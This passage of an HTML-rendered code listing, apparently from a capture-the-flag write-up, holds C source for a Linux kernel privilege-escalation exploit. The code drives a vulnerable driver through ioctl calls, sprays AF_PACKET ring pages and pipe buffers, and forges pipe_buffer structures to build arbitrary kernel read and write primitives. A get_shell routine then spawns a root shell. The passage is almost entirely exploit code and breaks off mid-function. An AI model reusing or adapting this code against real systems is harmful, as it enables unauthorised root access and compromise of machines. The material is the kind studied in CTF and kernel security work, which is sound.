class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">option</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x114</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x810</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1919</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x514</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">0</span>,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span 